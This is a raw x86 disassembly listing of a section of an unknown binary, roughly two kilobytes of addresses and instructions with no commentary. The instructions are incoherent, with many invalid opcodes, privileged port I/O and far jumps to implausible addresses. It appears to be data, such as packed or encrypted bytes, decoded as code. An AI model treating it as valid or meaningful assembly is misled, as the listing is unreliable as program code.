  41660e:	or     edi,DWORD PTR [ecx+esi*8+0x70]
  416612:	(bad)  cs:[edx+0x12]
  416616:	xlat   BYTE PTR ds:[ebx]
  416617:	(bad)  
  416618:	xor    ch,al
  41661a:	cmc    
  41661b:	sbb    ebx,esp
  41661d:	and    eax,DWORD PTR [ebx-0xe26a006]
  416623:	out    0x90,al
  416625:	in     al,dx
  416626:	dec    ebx
  416627:	cmp    DWORD PTR [eax-0x6d3e4aba],0xfffffffe
  41662e:	mov    BYTE PTR [esp+ebx*8+0x4bb08044],dh
  416635:	mov    fs:0x2f2fd93a,al
  41663b:	sub    ebp,edx
  41663d:	pushf  
  41663e:	add    dl,BYTE PTR [edi-0x35ff565]
  416644:	pop    esi
  416645:	in     eax,dx
  416646:	std    
  416647:	add    eax,0xf07c72c2
  41664c:	jmp    0x41664f
  41664e:	push   ecx
  41664f:	pusha  
  416650:	retf   0xb44a
  416653:	data16 cmp dh,ch
  416656:	ins    DWORD PTR es:[edi],dx
  416657:	add    dh,ch
  416659:	daa    
  41665a:	aad    0x78
  41665c:	int3   
  41665d:	mov    ebp,0x52b6fb7b
  416662:	sub    ch,cl
  416664:	outs   dx,BYTE PTR ds:[esi]
  416665:	pop    ecx
  416666:	cmp    al,0xb7
  416668:	dec    ebp
  416669:	pop    ds
  41666a:	push   esi
  41666b:	or     ebp,esi
  41666d:	stos   DWORD PTR es:[edi],eax
  41666e:	in     eax,0x23
  416670:	mov    bl,0xe7
  416672:	push   esp
  416673:	sahf   
  416674:	lock aaa 
  416676:	mov    ds:0xa9d65364,al
  41667b:	scas   al,BYTE PTR es:[edi]
  41667c:	fild   WORD PTR [edx]
  41667e:	(bad)
  416681:	push   ecx
  416682:	fnstsw WORD PTR [edi]
  416684:	imul   ecx,DWORD PTR [edx],0x55
  416687:	push   ecx
  416688:	(bad)  
  416689:	sbb    DWORD PTR [edx],edx
  41668b:	mov    ch,bl
  41668d:	and    ch,dl
  41668f:	mov    al,ds:0x7de09a0c
  416694:	in     eax,0x73
  416696:	dec    esp
  416697:	mov    eax,0xf0e78f07
  41669c:	fsubp  st(1),st
  41669e:	mov    cl,0xa5
  4166a0:	lock push 0x4827cc04
  4166a6:	cmp    DWORD PTR [ebx],edx
  4166a8:	test   DWORD PTR [ecx],ecx
  4166aa:	or     BYTE PTR [edi],0xda
  4166ad:	pop    es
  4166ae:	mov    BYTE PTR [eax+0x4c37b67b],0x47
  4166b5:	(bad)  [ebp+0x1]
  4166b8:	push   edi
  4166b9:	loop   0x416725
  4166bb:	mov    dh,0xfb
  4166bd:	dec    esp
  4166be:	xchg   edi,eax
  4166bf:	mul    DWORD PTR [edi]
  4166c1:	inc    ebx
  4166c2:	mov    ds:0x5ddb8c8e,al
  4166c7:	sahf   
  4166c8:	jo     0x4166c5
  4166ca:	pushf  
  4166cb:	push   esp
  4166cc:	jmp    0x497d5e8
  4166d1:	mov    edx,0xb2ed7922
  4166d6:	outs   dx,DWORD PTR ds:[esi]
  4166d7:	sbb    edi,eax
  4166d9:	push   ds
  4166da:	or     DWORD PTR [ebp-0x2c95f43f],esi
  4166e0:	dec    edi
  4166e1:	das    
  4166e2:	add    eax,0x4c6be7fa
  4166e7:	clc    
  4166e8:	mov    cl,0x10
  4166ea:	call   0x8cae63a4
  4166ef:	emms   
  4166f1:	scas   eax,DWORD PTR es:[edi]
  4166f2:	ror    DWORD PTR [ebp+edx*2+0x1],cl
  4166f6:	es sahf 
  4166f8:	dec    edi
  4166f9:	(bad)  
  4166fa:	in     al,0xe5
  4166fc:	push   es
  4166fd:	mov    ah,0x73
  4166ff:	xchg   ecx,eax
  416700:	inc    eax
  416701:	add    DWORD PTR [ebx],0xcea8571a
  416707:	pop    esp
  416708:	push   ss
  416709:	fist   WORD PTR [esi+0x33]
  41670c:	xchg   DWORD PTR [ebx+0x688c60d3],edi
  416712:	(bad)  
  416713:	xor    dh,BYTE PTR [edx+edi*1+0x10453a76]
  41671a:	(bad)  
  41671b:	in     eax,dx
  41671c:	sub    DWORD PTR [esi+0x2aab656c],0xf8661bcc
  416726:	cmp    cl,BYTE PTR [ebx]
  416728:	mov    esi,cs
  41672a:	loop   0x4166dc
  41672c:	not    BYTE PTR [edi]
  41672e:	stos   BYTE PTR es:[edi],al
  41672f:	popa   
  416730:	cwde   
  416731:	push   ebx
  416732:	and    ebx,ebx
  416734:	lods   eax,DWORD PTR ds:[esi]
  416735:	sbb    eax,0xdc5c5431
  41673a:	pop    es
  41673b:	mov    dh,BYTE PTR [esi+0x1]
  41673e:	pop    ds
  41673f:	dec    esp
  416740:	mov    DWORD PTR [eax-0x734d906c],0xc68723d4
  41674a:	xchg   ebx,eax
  41674b:	cdq    
  41674c:	loop   0x41675f
  41674e:	inc    ebx
  41674f:	and    ah,BYTE PTR [ebx-0x42590374]
  416755:	hlt    
  416756:	mov    esp,0xe9e2dafb
  41675b:	call   0x1dc2cba1
  416760:	aad    0xea
  416762:	or     DWORD PTR [esi+0x223a646a],ebx
  416768:	repnz lds eax,FWORD PTR [ebx+0x46]
  41676c:	fs inc ecx
  41676e:	test   al,0xd9
  416770:	inc    edi
  416771:	pop    es
  416772:	and    BYTE PTR [ecx],dh
  416774:	mov    ds:0x305eb165,eax
  416779:	repz clc 
  41677b:	cmc    
  41677c:	dec    eax
  41677d:	std    
  41677e:	xor    eax,DWORD PTR [bp+si]
  416781:	ror    DWORD PTR [ecx],cl
  416783:	pop    ecx
  416784:	xchg   ebx,eax
  416785:	pop    ebp
  416786:	repnz rcl BYTE PTR [ebx-0x41],cl
  41678a:	sbb    al,0x7d
  41678c:	fidiv  WORD PTR [edi+0x6f]
  41678f:	fistp  QWORD PTR [ebx]
  416791:	mov    BYTE PTR [ebx-0xa1c5de3],cl
  416797:	pop    edx
  416798:	sbb    ah,BYTE PTR [edi-0x477d091b]
  41679e:	inc    ecx
  41679f:	out    dx,eax
  4167a0:	mov    edi,0x9e1bbbf5
  4167a5:	inc    ebp
  4167a6:	fs test al,0x42
  4167a9:	lahf   
  4167aa:	dec    esp
  4167ab:	fst    QWORD PTR [edi+0x55282501]
  4167b1:	gs sub eax,0xabe7394c
  4167b7:	outs   dx,BYTE PTR ds:[esi]
  4167b8:	pop    edx
  4167b9:	sbb    edx,edx
  4167bb:	pop    esi
  4167bc:	push   ds
  4167bd:	push   ss
  4167be:	pop    es
  4167bf:	mov    al,0x49
  4167c1:	xor    esp,DWORD PTR [edi-0x1a]
  4167c4:	(bad)  
  4167c5:	icebp  
  4167c6:	pop    eax
  4167c7:	add    ebp,edx
  4167c9:	pop    esi
  4167ca:	ret    
  4167cb:	dec    eax
  4167cc:	fwait
  4167cd:	xor    al,0xa6
  4167cf:	and    cl,dl
  4167d1:	jle    0x4167f0
  4167d3:	add    al,0x1c
  4167d5:	or     BYTE PTR [ecx-0x530d5984],ah
  4167db:	jg     0x416812
  4167dd:	in     al,0x99
  4167df:	ins    BYTE PTR es:[edi],dx
  4167e0:	xchg   edi,eax
  4167e1:	xor    DWORD PTR [ecx+0x1c],ebx
  4167e4:	inc    esi
  4167e5:	ja     0x41680c
  4167e7:	mov    esp,0x9a040cbd
  4167ec:	xchg   ecx,eax
  4167ed:	sub    edx,esi
  4167ef:	jbe    0x4167a9
  4167f1:	fisubr DWORD PTR [eax-0x34]
  4167f4:	pusha  
  4167f5:	fisubr DWORD PTR [ebx+ebp*2-0x11abc340]
  4167fc:	lea    ecx,[ecx+0x5c]
  4167ff:	sbb    esi,esp
  416801:	rcl    DWORD PTR [eax],cl
  416803:	sub    edi,ebx
  416805:	adc    esp,DWORD PTR [ebx]
  416807:	pop    ebp
  416808:	leave  
  416809:	push   esi
  41680a:	sbb    BYTE PTR [eax+0x7617247c],dl
  416810:	cs je  0x4167e6
  416813:	pop    eax
  416814:	mov    eax,0xe0d6a31c
  416819:	in     al,dx
  41681a:	inc    esi
  41681b:	jnp    0x416884
  41681d:	jmp    0x8937247e
  416822:	fwait
  416823:	adc    eax,0x79e5499
  416828:	xchg   esi,eax
  416829:	jns    0x41682e
  41682b:	addr16 fwait
  41682d:	sub    al,0x78
  41682f:	cmp    DWORD PTR [edx+0x6c],eax
  416832:	lahf   
  416833:	test   DWORD PTR [esi-0x729c022a],edi
  416839:	mov    dl,0x21
  41683b:	inc    esi
  41683c:	jae    0x416817
  41683e:	xchg   esi,eax
  41683f:	out    dx,eax
  416840:	fwait
  416841:	dec    esp
  416842:	(bad)  [edi-0x7f5a599c]
  416848:	pop    ecx
  416849:	jecxz  0x4168ad
  41684b:	push   edx
  41684c:	std    
  41684d:	mov    DWORD PTR [ebx],ebp
  41684f:	cmp    ecx,DWORD PTR [eax-0x25]
  416852:	test   DWORD PTR [ebx+0x4323b41f],0x2f9ac186
  41685c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41685d:	pop    es
  41685e:	pop    ds
  41685f:	test   al,0xe7
  416861:	and    eax,0x6b8514f2
  416866:	stc    
  416867:	mov    eax,0x7016cfd8
  41686c:	je     0x416887
  41686e:	adc    eax,DWORD PTR ss:[edi+0x6f22fbbe]
  416875:	xor    al,0x52
  416877:	add    al,0xa
  416879:	cmp    esi,DWORD PTR [edi+0x42ebf17c]
  41687f:	add    BYTE PTR [ecx],dl
  416881:	lahf   
  416882:	xlat   BYTE PTR ds:[ebx]
  416883:	mov    ebx,DWORD PTR [esi+0x57]
  416886:	out    0x9f,al
  416888:	std    
  416889:	cmp    al,0x8
  41688b:	stos   DWORD PTR es:[edi],eax
  41688c:	inc    ebp
  41688d:	outs   dx,BYTE PTR ds:[esi]
  41688e:	mov    ecx,0x7b10c088
  416893:	sub    al,0x3f
  416895:	lea    esi,[edi-0x499c8dc7]
  41689b:	ret    0xa07e
  41689e:	mov    ds:0x7fe6f797,eax
  4168a3:	inc    ebx
  4168a4:	jno    0x4168a8
  4168a6:	push   esp
  4168a7:	arpl   WORD PTR [ebx-0x2f],di
  4168aa:	mov    edx,0xa41fac61
  4168af:	lock enter 0x20ec,0xba
  4168b4:	pop    edi
  4168b5:	and    DWORD PTR [esi+edi*4],edx
  4168b8:	popf   
  4168b9:	add    ebx,ebx
  4168bb:	cmp    esi,DWORD PTR [edx]
  4168bd:	call   0x6f5e:0x7dc22aea
  4168c4:	out    0x69,al
  4168c6:	daa    
  4168c7:	pop    ss
  4168c8:	pop    ss
  4168c9:	xor    bl,cl
  4168cb:	rol    DWORD PTR [edx-0x6f],0x9d
  4168cf:	aam    0x1f
  4168d1:	cld    
  4168d2:	mov    edi,0xfe00de47
  4168d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168d8:	(bad)  [edi-0x16]
  4168db:	addr16 xchg ebp,eax
  4168dd:	ss pop es
  4168df:	outs   dx,BYTE PTR ds:[esi]
  4168e0:	int    0x57
  4168e2:	xchg   DWORD PTR [esi],esp
  4168e4:	add    DWORD PTR [edi],esi
  4168e6:	sbb    eax,0x91a11748
  4168eb:	cmp    al,BYTE PTR [ebx]
  4168ed:	bswap  edx
  4168ef:	xor    al,0x47
  4168f1:	pop    eax
  4168f2:	push   esp
  4168f3:	das    
  4168f4:	(bad)  
  4168f6:	and    ebp,DWORD PTR [ecx*8-0x33d4f5f0]
  4168fd:	mov    eax,0x4057b70a
  416902:	jecxz  0x416942
  416904:	(bad)  
  416905:	sar    bh,0x36
  416908:	(bad)  
  416909:	mov    ds,WORD PTR [edx]
  41690b:	ficom  WORD PTR [edi+0x5d]
  41690e:	or     esp,DWORD PTR [eax+ebx*2+0x7f73807]
  416915:	jecxz  0x416920
  416917:	idiv   ecx
  416919:	imul   esp,DWORD PTR [edx+0x5e365fd6],0xc80e15be
  416923:	lahf   
  416924:	iret   
  416925:	sub    al,0xa0
  416927:	dec    edi
  416928:	mov    esp,0xb0085250
  41692d:	repz or BYTE PTR [edi+ebp*1+0x5e7d3be0],0x2f
  416936:	neg    DWORD PTR [edx]
  416938:	mov    bh,0x5a
  41693a:	push   edx
  41693b:	mov    bh,BYTE PTR [eax]
  41693d:	mov    dh,0xa7
  41693f:	cmp    al,0x54
  416941:	jp     0x4169b4
  416943:	mov    ch,0x99
  416945:	fidiv  WORD PTR [ecx-0x6e51bfdc]
  41694b:	push   0x404839eb
  416950:	daa    
  416951:	mov    ?,edi
  416953:	xor    al,0x24
  416955:	inc    ebp
  416956:	cmp    al,0x79
  416958:	jb     0x4168f7
  41695a:	xor    eax,0x6049fabb
  41695f:	ret    0xb8d6
  416962:	mov    ecx,DWORD PTR [ebx+ecx*2-0x36f3f6cc]
  416969:	mov    eax,ds:0x6dc153c
  41696e:	out    0xf7,eax
  416970:	in     eax,0xd9
  416972:	xlat   BYTE PTR ds:[ebx]
  416973:	dec    ecx
  416974:	loopne 0x416974
  416976:	popa   
  416977:	fsub   st,st(5)
  416979:	adc    bh,BYTE PTR [ebx+edi*2]
  41697c:	mov    cl,0xe8
  41697e:	jnp    0x416985
  416980:	jne    0x416941
  416982:	mul    BYTE PTR [edi+ebx*1]
  416985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416986:	lock idiv esi
  416989:	mov    cl,0x38
  41698b:	dec    ebp
  41698c:	push   edi
  41698d:	shl    BYTE PTR [ebp-0x17],0xeb
  416991:	xor    BYTE PTR ds:0x2fd379b5,dl
  416997:	add    ecx,DWORD PTR [edx]
  416999:	xchg   esi,eax
  41699a:	fist   WORD PTR [esp+ebx*4-0x4f]
  41699e:	(bad)  
  41699f:	pop    ebp
  4169a0:	sbb    ebp,0xd4887ed9
  4169a6:	inc    esp
  4169a7:	inc    esp
  4169a8:	leave  
  4169a9:	pusha  
  4169aa:	setge  cl
  4169ad:	jg     0x4169be
  4169af:	xchg   ecx,eax
  4169b0:	aas    
  4169b1:	mov    ch,0x6b
  4169b3:	mov    ah,0x53
  4169b5:	sub    bh,BYTE PTR [edi+0x66]
  4169b8:	es ins BYTE PTR es:[edi],dx
  4169ba:	jmp    0x9153:0x6fcb068e
  4169c1:	sbb    DWORD PTR [ebx],ebp
  4169c3:	lods   al,BYTE PTR ds:[esi]
  4169c4:	and    DWORD PTR [edi-0x72],ecx
  4169c7:	pop    eax
  4169c8:	mov    ch,0x9a
  4169ca:	cmp    esi,DWORD PTR [edi+0xa]
  4169cd:	sahf   
  4169ce:	sbb    edi,DWORD PTR [ecx]
  4169d0:	mov    esi,edi
  4169d2:	jnp    0x416957
  4169d4:	icebp  
  4169d5:	fwait
  4169d6:	cmp    ch,ch
  4169d8:	leave  
  4169d9:	cmc    
  4169da:	pop    ebp
  4169db:	repnz imul ebp,DWORD PTR [ecx+eiz*8+0x35],0x358107cb
  4169e4:	repnz jecxz 0x4169d1
  4169e7:	lds    ebp,FWORD PTR [eax]
  4169e9:	sbb    edi,edx
  4169eb:	mov    ebx,0xfedba2a0
  4169f0:	push   cs
  4169f1:	arpl   WORD PTR [ebp+0x2b],ax
  4169f4:	jnp    0x416a35
  4169f6:	mov    cs,WORD PTR [edi]
  4169f8:	xchg   edi,eax
  4169f9:	jns    0x416a66
  4169fb:	pop    esi
  4169fc:	pop    ebx
  4169fd:	xchg   ebp,eax
  4169fe:	mov    eax,0x3239d776
  416a03:	jecxz  0x4169bb
  416a05:	sti    
  416a06:	je     0x4169f1
  416a08:	repnz imul ebx,DWORD PTR [esi+0x6f],0xffffffe1
  416a0d:	mov    cl,ah
  416a0f:	into   
  416a10:	dec    edx
  416a11:	adc    dl,BYTE PTR [ebx+ecx*1+0x5ed1238f]
  416a18:	xchg   esp,eax
  416a19:	pop    es
  416a1a:	push   es
  416a1b:	add    al,0x8b
  416a1d:	mov    ah,0x48
  416a1f:	mov    bh,0xc4
  416a21:	out    dx,eax
  416a22:	and    eax,0x4ff4be61
  416a27:	test   BYTE PTR [edx+0xc5630b9],cl
  416a2d:	popf   
  416a2e:	cmc    
  416a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a30:	dec    edi
  416a31:	fsubr  st,st(4)
  416a33:	pushf  
  416a34:	dec    ebx
  416a35:	popa   
  416a36:	test   esp,eax
  416a38:	xor    al,0xbc
  416a3a:	adc    BYTE PTR [esi-0x4e0aa0bf],0xe1
  416a41:	ins    BYTE PTR es:[edi],dx
  416a42:	and    esp,DWORD PTR [edi+0x7d1b77c6]
  416a48:	push   ebx
  416a49:	je     0x416a85
  416a4b:	iret   
  416a4c:	lock mov edi,0x37004ea5
  416a52:	(bad)  
  416a53:	repnz xor bl,BYTE PTR [esi+0x46]
  416a57:	(bad)  
  416a58:	sbb    BYTE PTR [ecx-0x49],cl
  416a5b:	push   esp
  416a5c:	addr16 xchg esi,eax
  416a5e:	add    edi,DWORD PTR [edx-0x36f943a1]
  416a64:	(bad)  
  416a65:	adc    eax,0xedba8dea
  416a6a:	loope  0x416aa3
  416a6c:	sti    
  416a6d:	adc    BYTE PTR ds:0x1c0c1258,0x51
  416a74:	retf   
  416a75:	ins    BYTE PTR es:[edi],dx
  416a76:	out    0x21,al
  416a78:	and    al,0x58
  416a7a:	in     eax,0x17
  416a7c:	xor    DWORD PTR [esi-0x4109c216],edi
  416a82:	aad    0x64
  416a84:	push   cs
  416a85:	mov    dl,0x5
  416a87:	mov    bl,0xd4
  416a89:	and    al,0x78
  416a8b:	mov    dl,0x26
  416a8d:	add    DWORD PTR [ecx+0x859f5fa],esi
  416a93:	adc    edi,ecx
  416a95:	daa    
  416a96:	inc    esp
  416a97:	mov    BYTE PTR [esp+edx*4],dl
  416a9a:	aad    0xe6
  416a9c:	inc    BYTE PTR [eax-0x6c476d1]
  416aa2:	stos   BYTE PTR es:[edi],al
  416aa3:	inc    eax
  416aa4:	cli    
  416aa5:	fsubr  QWORD PTR [ebp+0x3871d8a9]
  416aab:	dec    edx
  416aac:	idiv   BYTE PTR [edi+ebp*1-0x5ec03543]
  416ab3:	push   esi
  416ab4:	test   eax,0xf567cc8a
  416ab9:	cmp    bl,BYTE PTR [esi-0x5684a19e]
  416abf:	ins    BYTE PTR es:[edi],dx
  416ac0:	fwait
  416ac1:	lahf   
  416ac2:	mov    BYTE PTR [edi-0x70],ch
  416ac5:	ins    DWORD PTR es:[edi],dx
  416ac6:	xor    edx,DWORD PTR [edx-0x31460d0]
  416acc:	inc    eax
  416acd:	inc    ebx
  416ace:	cdq    
  416acf:	aad    0x85
  416ad1:	dec    ebp
  416ad2:	cmp    BYTE PTR ds:0x3838685e,dh
  416ad8:	xor    BYTE PTR [ebx],bh
  416ada:	sub    al,0x3
  416adc:	arpl   WORD PTR [ebx+0xcd51aad],ax
  416ae2:	sar    BYTE PTR [esi],1
  416ae4:	rcl    DWORD PTR [ecx+0x56],0x92
  416ae8:	push   ds
  416ae9:	dec    edx
  416aea:	xchg   ecx,edx
  416aec:	pop    ds
  416aed:	or     eax,0x4f00e96d
  416af2:	xchg   ebx,eax
  416af3:	ret    
  416af4:	adc    al,0xd
  416af6:	clc    
  416af7:	jmp    0x2ff:0xe14be5b2
  416afe:	out    0x42,eax
  416b00:	mov    edi,0xb6cb10c8
  416b05:	(bad)  
  416b06:	popa   
  416b07:	sti    
  416b08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b09:	sar    esp,1
  416b0b:	mov    dl,0xc4
  416b0d:	push   0x1f73044a
  416b12:	cmp    DWORD PTR [esi],esi
  416b14:	test   eax,eax
  416b16:	sbb    ebp,esi
  416b18:	ret    0x8de9
  416b1b:	adc    esi,esp
  416b1d:	mov    ch,0x26
  416b1f:	mov    eax,0x428601d7
  416b24:	leave  
  416b25:	add    eax,0x4bcfea03
  416b2a:	scas   al,BYTE PTR es:[edi]
  416b2b:	dec    ebp
  416b2c:	fwait
  416b2d:	xchg   edx,eax
  416b2e:	xor    ah,BYTE PTR [edi-0x33fe8f87]
  416b34:	out    dx,eax
  416b35:	xchg   ecx,eax
  416b36:	sbb    BYTE PTR [edx+0x6b],bl
  416b39:	fild   WORD PTR [edx+0x24]
  416b3c:	fcmovnbe st,st(5)
  416b3e:	mov    al,0x74
  416b40:	mov    bh,0x96
  416b42:	(bad)
  416b45:	je     0x416b2c
  416b47:	popf   
  416b48:	mov    edx,0x90b9ef47
  416b4d:	repz mov dl,0xa1
  416b50:	and    BYTE PTR [ecx+edi*8+0x13],0x35
  416b55:	pop    ds
  416b56:	(bad)  
  416b57:	in     eax,dx
  416b58:	mov    bh,0x8e
  416b5a:	xlat   BYTE PTR ds:[ebx]
  416b5b:	cli    
  416b5c:	push   0xd
  416b5e:	ret    0xa0b2
  416b61:	inc    esp
  416b62:	out    0xd8,al
  416b64:	sar    bh,1
  416b66:	xchg   esi,eax
  416b67:	jge    0x416be1
  416b69:	add    ebp,esi
  416b6b:	mov    eax,0x1300b823
  416b70:	dec    esp
  416b71:	inc    ecx
  416b72:	les    eax,FWORD PTR [eax+ecx*4-0xc]
  416b76:	stc    
  416b77:	mov    ah,0xab
  416b79:	test   eax,0x70f42769
  416b7e:	jae    0x416b7e
  416b80:	and    esp,ebp
  416b82:	mov    eax,0x82c59de7
  416b87:	retf   0xa71f
  416b8a:	rol    DWORD PTR [eax],cl
  416b8c:	cmp    bl,0xf7
  416b8f:	fs mov edi,0xe5543918
  416b95:	loopne 0x416b70
  416b97:	dec    BYTE PTR [edx+0x16]
  416b9a:	mov    bl,0x67
  416b9c:	ror    DWORD PTR [ebx],cl
  416b9e:	fwait
  416b9f:	lahf   
  416ba0:	jmp    0x69c8:0x19b72fd3
  416ba7:	sbb    ebx,0xf66f0f7
  416bad:	test   BYTE PTR [esi+0x72],ch
  416bb0:	cli    
  416bb1:	jae    0x416b65
  416bb3:	arpl   WORD PTR ds:0x5da462a7,dx
  416bb9:	xchg   edx,eax
  416bba:	lea    edx,[esi+0xc842c4]
  416bc0:	and    eax,0x350f4280
  416bc5:	(bad)  
  416bc6:	or     al,0xd8
  416bc8:	mov    ah,BYTE PTR [edi+0x67]
  416bcb:	call   FWORD PTR [esi]
  416bcd:	add    dh,bl
  416bcf:	push   esi
  416bd0:	jnp    0x416bda
  416bd2:	hlt    
  416bd3:	int    0xb5
  416bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bd6:	shl    DWORD PTR ss:0x8d1afd94,1
  416bdd:	sub    al,0x9b
  416bdf:	adc    BYTE PTR [ebx],0x8b
  416be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416be3:	cmc    
  416be4:	pop    ss
  416be5:	pop    ds
  416be6:	and    DWORD PTR [edi+0x50a00374],0xffffffa2
  416bed:	push   esp
  416bee:	mov    al,0x5f
  416bf0:	add    BYTE PTR [ecx-0x6a322f7d],0x71
  416bf7:	push   edx
  416bf8:	xchg   edi,eax
  416bf9:	jbe    0x416bf5
  416bfb:	push   edi
  416bfc:	sub    BYTE PTR [ebx+eiz*4+0x79],al
  416c00:	in     eax,dx
  416c01:	xchg   ebp,eax
  416c02:	mov    ecx,0x9c28d7f1
  416c07:	pusha  
  416c08:	mov    DWORD PTR [edx-0x47151f88],edx
  416c0e:	xlat   BYTE PTR ds:[ebx]
  416c0f:	inc    esi
  416c10:	repnz fcomi st,st(7)
  416c13:	add    al,0xe2
  416c15:	mov    ebp,0x92f998f6
  416c1a:	inc    edx
  416c1b:	mov    al,BYTE PTR [edi]
  416c1d:	or     al,BYTE PTR [eax+edi*8]
  416c20:	test   DWORD PTR [eax-0x1f59041a],ecx
  416c26:	sub    al,0x1c
  416c28:	push   0x2fa2a987
  416c2d:	test   eax,0xd9f86e27
  416c33:	mov    ecx,0x26e219ec
  416c38:	mov    eax,ds:0xb50bd74b
  416c3d:	push   edx
  416c3e:	enter  0x8f35,0x3e
  416c42:	mov    ebp,0x1130383b
  416c47:	cmp    al,BYTE PTR [ecx]
  416c49:	push   esp
  416c4b:	pop    eax
  416c4c:	fsub   DWORD PTR [ecx]
  416c4e:	aaa    
  416c4f:	cmp    DWORD PTR [edx-0x4002d3a8],ecx
  416c55:	xchg   ecx,eax
  416c56:	inc    edi
  416c57:	mov    cl,0x29
  416c59:	pop    ebx
  416c5a:	cdq    
  416c5b:	inc    ebx
  416c5c:	adc    DWORD PTR [ecx-0x64],ebp
  416c5f:	or     al,BYTE PTR [edi+0x1fd4b3b5]
  416c65:	gs mov bh,0xb9
  416c68:	add    DWORD PTR [ecx+0x36c13075],esp
  416c6e:	je     0x416cac
  416c70:	xor    edx,DWORD PTR [ecx]
  416c72:	retf   
  416c73:	jnp    0x416cc3
  416c75:	je     0x416c6f
  416c77:	imul   esi,DWORD PTR [esi+0x54],0xfad2bcc6
  416c7e:	les    esi,FWORD PTR [ecx-0x77581f96]
  416c84:	xor    al,0x8c
  416c86:	xchg   ebp,eax
  416c87:	push   esi
  416c88:	enter  0x6e81,0xdc
  416c8c:	push   ebx
  416c8d:	add    DWORD PTR [eax],ebx
  416c8f:	inc    ecx
  416c90:	jmp    ebp
  416c92:	bound  edi,QWORD PTR [edx+0x25a12382]
  416c98:	sbb    eax,0xcb82b942
  416c9d:	pop    ebp
  416c9e:	sbb    al,0xaa
  416ca0:	loopne 0x416cf7
  416ca2:	cmp    al,0x2c
  416ca4:	shl    DWORD PTR ds:0x671761eb,0x97
  416cab:	add    BYTE PTR [ebx],bl
  416cad:	and    esi,DWORD PTR [esp+esi*1+0x72]
  416cb1:	jns    0x416cb2
  416cb3:	dec    edi
  416cb4:	nop
  416cb5:	dec    esi
  416cb6:	retf   
  416cb7:	lods   al,BYTE PTR ds:[esi]
  416cb8:	mov    dh,0xc6
  416cba:	dec    ebp
  416cbb:	jns    0x416d0b
  416cbd:	mov    ah,cl
  416cbf:	icebp  
  416cc0:	jg     0x416d24
  416cc2:	pop    esp
  416cc3:	bound  esp,QWORD PTR [ebx+0x7305f080]
  416cc9:	pushf  
  416cca:	mov    ah,0x5c
  416ccc:	call   0xc039d619
  416cd1:	push   0xfffffff6
  416cd3:	dec    ebx
  416cd4:	inc    esp
  416cd5:	test   ebp,0x935e2efb
  416cdb:	gs add al,al
  416cde:	fsubr  DWORD PTR [eax-0x602954d4]
  416ce4:	push   esp
  416ce5:	xchg   ebp,eax
  416ce6:	mov    esp,0xf0d91ff6
  416ceb:	fnsetpm(287 only) 
  416ced:	mov    BYTE PTR [ebx-0x15f1aa22],0x4d
  416cf4:	dec    esi
  416cf5:	sbb    bh,BYTE PTR [eax+0x1af1744]
  416cfb:	push   ds
  416cfc:	xchg   esi,eax
  416cfd:	push   esi
  416cfe:	mov    edx,0xd33534e4
  416d03:	pop    esp
  416d04:	push   edi
  416d05:	sbb    DWORD PTR [edi],ebx
  416d07:	push   0xffffffc3
  416d09:	push   ss
  416d0a:	xchg   esp,eax
  416d0b:	not    BYTE PTR [edi-0x10]
  416d0e:	bound  edi,QWORD PTR [ebx+0x5]
  416d11:	stc    
  416d12:	pop    esp
  416d13:	cli    
  416d14:	mov    al,0x61
  416d16:	jns    0x416d8a
  416d18:	inc    ebp
  416d19:	xchg   ecx,eax
  416d1a:	sbb    al,BYTE PTR [esi+0x7e]
  416d1d:	jne    0x416d18
  416d1f:	xchg   ecx,eax
  416d20:	int3   
  416d21:	(bad)  
  416d22:	repz jg 0x416d58
  416d25:	xor    BYTE PTR [ebx],bh
  416d27:	ret    
  416d28:	mov    dh,0x94
  416d2a:	add    al,0x4a
  416d2c:	pop    es
  416d2d:	out    0x93,al
  416d2f:	fild   WORD PTR [ecx-0x4b3e665d]
  416d35:	gs mov dh,0x53
  416d38:	retf   
  416d39:	mov    eax,0xc72d2c83
  416d3e:	pop    ds
  416d3f:	out    0x2d,eax
  416d41:	push   eax
  416d42:	mov    ebx,DWORD PTR [ebx-0x6d]
  416d45:	jg     0x416cf6
  416d47:	sar    edi,0xda
  416d4a:	imul   edx,esp,0x2a
  416d4d:	cwde   
  416d4e:	xor    eax,0x36d8d2f8
  416d53:	mov    ecx,0x439ebfa3
  416d58:	pop    eax
  416d59:	cwde   
  416d5a:	(bad)  
  416d5d:	retf   
  416d5e:	xor    ah,BYTE PTR [ebp+0x21]
  416d61:	xchg   esp,eax
  416d62:	jbe    0x416d57
  416d64:	inc    edx
  416d65:	ins    DWORD PTR es:[edi],dx
  416d66:	iret   
  416d67:	push   es
  416d68:	sbb    al,cl
  416d6a:	lock pushf 
  416d6c:	and    BYTE PTR [ebx],dl
  416d6e:	pop    esi
  416d6f:	add    eax,0x891f19cf
  416d74:	push   ss
  416d75:	add    DWORD PTR [edx+esi*1],eax
  416d78:	mov    al,0xf7
  416d7a:	ds mov cl,0xe9
  416d7d:	push   ebx
  416d7e:	pop    ds
  416d7f:	xor    esp,0xfffffffd
  416d82:	fcomip st,st(3)
  416d84:	and    ebx,DWORD PTR [edx+0x3c]
  416d87:	imul   ecx,eax,0xfffffff0
  416d8a:	jne    0x416db1
  416d8c:	pop    ebp
  416d8d:	sbb    DWORD PTR [ecx+0x64],eax
  416d90:	sbb    eax,0xa8956ee0
  416d95:	pop    eax
  416d96:	test   al,0x79
  416d98:	mov    dl,0xda
  416d9a:	or     esp,DWORD PTR [ebp+0x34]
  416d9d:	and    DWORD PTR [ebp+0x29],esp
  416da0:	ins    DWORD PTR es:[edi],dx
  416da1:	aad    0xa8
  416da3:	fisub  DWORD PTR [ebp+0x11f35c9]
  416da9:	mov    al,BYTE PTR [bp+si+0x5b]
  416dad:	lds    eax,FWORD PTR [edx+0x52]
  416db0:	into   
  416db1:	jmp    0xfd85e05
  416db6:	lods   eax,DWORD PTR gs:[esi]
  416db8:	cli    
  416db9:	or     DWORD PTR [edx],esi
  416dbb:	sbb    ebx,DWORD PTR [eax-0x30]
  416dbe:	dec    ebp
  416dbf:	dec    esi
  416dc0:	sbb    DWORD PTR [esi],ecx
  416dc2:	fucomi st,st(1)
  416dc4:	iret   
